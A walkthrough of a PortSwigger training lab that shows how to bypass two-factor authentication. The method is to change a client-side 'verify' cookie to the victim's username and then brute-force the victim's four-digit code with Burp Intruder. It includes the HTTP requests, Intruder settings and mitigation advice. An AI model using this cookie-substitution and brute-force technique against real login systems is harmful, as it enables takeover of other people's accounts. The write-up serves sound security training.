# 📘 PortSwigger Lab: 2FA Broken Logic

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic  
> 🎯 Topic: Authentication vulnerabilities — flawed two-factor verification logic  
> 🧪 Difficulty: Practitioner

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🏗 Correct 2FA Flow](#correct-flow)
- [❌ Vulnerable Application Logic](#vulnerable-flow)
- [🍪 Why the `verify` Parameter Is Dangerous](#verify-cookie)
- [🔍 Step 1 — Investigate Your Own Login Flow](#step1)
- [🔍 Step 2 — Identify the `verify` Parameter](#step2)
- [🔍 Step 3 — Generate a 2FA Code for Carlos](#step3)
- [🔍 Step 4 — Prepare the Intruder Request](#step4)
- [🔍 Step 5 — Configure MFA Code Brute Force](#step5)
- [🔍 Step 6 — Find the Correct Code](#step6)
- [🔍 Step 7 — Access Carlos's Account](#step7)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [💡 Why the Hint About Carlos Matters](#hint)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)

---

<a id="goal"></a>

## 🎯 Goal

Access the account page of user `carlos` without knowing his password.

Available information:

```text
Your account:
wiener:peter

Victim username:
carlos
```

The lab also provides access to an email client, but only for receiving the attacker's own 2FA code.

The goal is to exploit flawed MFA logic, brute-force Carlos's temporary code, and authenticate as him.

---

<a id="theory"></a>

## 🧠 Short Theory

A normal two-factor authentication flow contains two steps:

```text
1. Submit username and password
2. Submit a temporary verification code
```

The main security requirement is:

```text
The second step must belong
to the same user
who passed the first step.
```

If the first step authenticated `wiener`, the server must only verify an MFA code for `wiener`.

The client must never be allowed to choose which account is being verified.

---

<a id="idea"></a>

## 🧩 Core Idea

The application uses this cookie:

```http
verify=wiener
```

to determine which user should have a 2FA code generated and verified.

Because cookies are controlled by the client, Burp Suite can modify the value.

The attacker changes:

```http
verify=wiener
```

to:

```http
verify=carlos
```

The server then processes Carlos's MFA flow even though Carlos's password was never submitted.

---

<a id="correct-flow"></a>

## 🏗 Correct 2FA Flow

A secure implementation should work like this:

```text
POST /login
username=wiener
password=peter
        ↓
Password correct
        ↓
Create a temporary server-side session
        ↓
session.user = wiener
session.mfa_completed = false
        ↓
User submits MFA code
        ↓
Server reads username from its session
        ↓
Verify code only for wiener
        ↓
session.mfa_completed = true
        ↓
Allow access to /my-account
```

The important point is:

```text
The username is stored by the server,
not supplied again by the client.
```

---

<a id="vulnerable-flow"></a>

## ❌ Vulnerable Application Logic

The lab behaves approximately like this:

```text
POST /login
username=wiener
password=peter
        ↓
Password correct
        ↓
Set-Cookie: verify=wiener
        ↓
GET /login2
Cookie: verify=wiener
        ↓
Generate MFA code for wiener
```

The attacker changes the cookie:

```text
verify=wiener
        ↓
verify=carlos
```

The next request becomes:

```text
GET /login2
Cookie: verify=carlos
        ↓
Generate MFA code for Carlos
```

Finally:

```text
POST /login2
Cookie: verify=carlos
mfa-code=0606
        ↓
Verify Carlos's code
        ↓
Authenticate as Carlos
```

Carlos's password is never required.

---

<a id="verify-cookie"></a>

## 🍪 Why the `verify` Parameter Is Dangerous

Cookies are stored in the browser and sent with HTTP requests.

Example:

```http
Cookie: verify=wiener; session=...
```

The client fully controls this value.

Burp Suite can replace it with:

```http
Cookie: verify=carlos; session=...
```

The server must not trust client-controlled identity information.

Potentially dangerous sources include:

```text
Cookie
GET parameter
POST parameter
Hidden form input
Custom HTTP header
Unsigned JWT payload
```

If one of these values decides which account is accessed or which user's MFA code is checked, test it for account substitution.

---

<a id="step1"></a>

## 🔍 Step 1 — Investigate Your Own Login Flow

Open the lab with Burp Suite running.

Log in using:

```text
Username: wiener
Password: peter
```

The application redirects to the second authentication step.

Your personal code can be retrieved using:

```text
Email client
```

The main goal at this stage is not only to log in, but to inspect the requests in:

```text
Proxy → HTTP history
```

Look for:

```text
POST /login
GET /login2
POST /login2
GET /my-account
```

---

<a id="step2"></a>

## 🔍 Step 2 — Identify the `verify` Parameter

The second-step request contains:

```http
Cookie: verify=wiener; session=...
```

Example:

```http
POST /login2 HTTP/2
Host: vulnerable-website.com
Cookie: verify=wiener; session=SESSION_VALUE
Content-Type: application/x-www-form-urlencoded

mfa-code=1234
```

The value:

```text
verify=wiener
```

tells the server which user's code should be checked.

This is suspicious because the value is supplied by the client.

---

<a id="step3"></a>

## 🔍 Step 3 — Generate a 2FA Code for Carlos

First, force the application to generate a temporary code for Carlos.

Find:

```http
GET /login2
```

in Proxy history and send it to Repeater:

```text
Right click → Send to Repeater
```

Change:

```http
Cookie: verify=wiener
```

to:

```http
Cookie: verify=carlos
```

Then send the request.

Example:

```http
GET /login2 HTTP/2
Host: vulnerable-website.com
Cookie: verify=carlos; session=SESSION_VALUE
```

This starts Carlos's MFA flow and causes the server to generate a temporary code for his account.

The code is not visible to the attacker, so it must be brute-forced.

---

<a id="step4"></a>

## 🔍 Step 4 — Prepare the Intruder Request

Return to the login page and authenticate again with:

```text
wiener:peter
```

On the MFA page, submit any invalid code, for example:

```text
0000
```

Find the resulting request:

```http
POST /login2
```

Example:

```http
POST /login2 HTTP/2
Host: vulnerable-website.com
Cookie: verify=wiener; session=SESSION_VALUE
Content-Type: application/x-www-form-urlencoded

mfa-code=0000
```

Send it to Intruder:

```text
Right click → Send to Intruder
```

---

<a id="step5"></a>

## 🔍 Step 5 — Configure MFA Code Brute Force

In Intruder, replace:

```http
verify=wiener
```

with:

```http
verify=carlos
```

Set a single payload position:

```http
mfa-code=§0000§
```

Attack type:

```text
Sniper
```

Payload type:

```text
Numbers
```

Configure:

```text
From: 0
To: 9999
Step: 1
```

Enable zero padding:

```text
Min integer digits: 4
```

Burp will generate:

```text
0000
0001
0002
0003
...
0606
...
9999
```

---

<a id="step6"></a>

## 🔍 Step 6 — Find the Correct Code

Most requests return the normal invalid-code response.

The successful request is identified by:

```http
302 Found
```

In this walkthrough, the valid code was:

```text
0606
```

Successful request:

```http
POST /login2 HTTP/2
Host: vulnerable-website.com
Cookie: verify=carlos; session=SESSION_VALUE
Content-Type: application/x-www-form-urlencoded

mfa-code=0606
```

Successful response:

```http
HTTP/2 302 Found
Location: /my-account
```

This means the application accepted the code and authenticated the session as Carlos.

---

<a id="step7"></a>

## 🔍 Step 7 — Access Carlos's Account

Select the Intruder result with:

```text
Status: 302
```

Use:

```text
Show response in browser
```

or open the target URL while preserving the active session.

Then request:

```text
/my-account
```

The account page displays:

```text
Your username is: carlos
```

The lab is solved.

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Log in as wiener:peter
        ↓
2. Find the verify=wiener cookie
        ↓
3. Send GET /login2 with verify=carlos
        ↓
4. Server generates Carlos's MFA code
        ↓
5. Send POST /login2 to Intruder
        ↓
6. Keep verify=carlos fixed
        ↓
7. Brute-force mfa-code from 0000 to 9999
        ↓
8. Identify 302 Found
        ↓
9. Correct code: 0606
        ↓
10. Open /my-account
        ↓
11. Access Carlos's account
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

The application trusted:

```text
verify
```

as the main user identifier.

The vulnerable logic may have looked like:

```python
username = request.cookies["verify"]
code = request.form["mfa-code"]

if verify_code(username, code):
    authenticate(username)
```

The flaw is:

```text
request.cookies["verify"]
```

is controlled by the attacker.

A secure version should use:

```python
username = session["pending_mfa_user"]
code = request.form["mfa-code"]

if verify_code(username, code):
    session["mfa_completed"] = True
```

The user identity must come from the protected server-side session created during the first authentication step.

---

<a id="hint"></a>

## 💡 Why the Hint About Carlos Matters

The lab states:

```text
Carlos will not attempt to log in to the website himself.
```

This matters because a new login attempt may generate a new MFA code.

Example:

```text
Current Carlos code: 0606
        ↓
Carlos starts another login
        ↓
New code generated: 4812
```

If the code changes while Intruder is running, the brute-force attack may continue against an expired value.

The hint guarantees that the generated code remains stable during the attack.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When testing multi-step authentication, examine the relationship between each stage.

Useful questions:

```text
1. How does the server know which user is completing MFA?
2. Where does the username come from during the second step?
3. Can that username be modified?
4. Is it matched against the first login step?
5. Is the code bound to a specific session?
6. Are failed attempts rate-limited?
7. Can another request regenerate the code?
```

Pay close attention to parameters such as:

```text
verify=
account=
user=
username=
email=
uid=
```

Main lesson:

```text
Strong MFA is useless
if the second step is not securely bound
to the user from the first step.
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### 1. Trying to log in as Carlos normally

Carlos's password is unknown and unnecessary.

### 2. Brute-forcing the code for Wiener

If the request still contains:

```text
verify=wiener
```

Intruder attacks the wrong account.

### 3. Skipping the modified `GET /login2`

Without this request, Carlos may not have an active temporary code.

### 4. Brute-forcing six-digit values

The lab uses a four-digit code:

```text
0000–9999
```

Only 10,000 combinations are required.

### 5. Forgetting zero padding

Without padding, Burp generates:

```text
0
1
2
...
606
```

instead of:

```text
0000
0001
0002
...
0606
```

### 6. Looking only at response length

The primary success indicator is:

```text
302 Found
```

### 7. Letting the attack continue after success

The session state may change after a successful request. Stop the attack and use the successful response.

### 8. Using an expired session cookie

A correct MFA code may fail if the temporary session is no longer valid.

---

<a id="defense"></a>

## 🛡 Mitigation

A secure implementation should use multiple protections.

### 1. Bind MFA to the server-side session

After password verification, store:

```text
pending_mfa_user = wiener
```

on the server.

### 2. Do not let the client choose the user

Values such as:

```text
verify=carlos
```

must never determine which account is being verified.

### 3. Bind the MFA code to the login session

The code should be associated with both the user and the exact temporary session.

### 4. Limit failed attempts

Example:

```text
5 invalid codes
        ↓
invalidate challenge
        ↓
require a new login
```

### 5. Use short expiration times

Temporary codes should expire quickly.

### 6. Enforce one-time use

Invalidate the code immediately after successful verification.

### 7. Monitor suspicious activity

Detect:

- thousands of MFA attempts;
- sequential code enumeration;
- sudden user identifier changes;
- unusual traffic to `/login2`.

Secure flow:

```text
Password correct
        ↓
Temporary server-side session
        ↓
Session bound to one user
        ↓
Limited MFA attempts
        ↓
Correct one-time code
        ↓
Fully authenticated session
```

---

<a id="checklist"></a>

## ✅ Checklist

- [x] Logged in as `wiener:peter`.
- [x] Inspected the complete MFA request flow.
- [x] Identified the `verify` parameter.
- [x] Confirmed that `verify` is stored in a cookie.
- [x] Sent `GET /login2` to Repeater.
- [x] Changed `verify=wiener` to `verify=carlos`.
- [x] Generated a temporary MFA code for Carlos.
- [x] Prepared the `POST /login2` request.
- [x] Sent the request to Intruder.
- [x] Selected Sniper.
- [x] Added a payload position to `mfa-code`.
- [x] Configured the range `0000–9999`.
- [x] Enabled zero padding.
- [x] Found a `302 Found` response.
- [x] Identified the code `0606`.
- [x] Opened `/my-account`.
- [x] Accessed Carlos's account.
- [x] Solved the lab.

---

# ⬆ Back to Top

[Return to contents](#top)
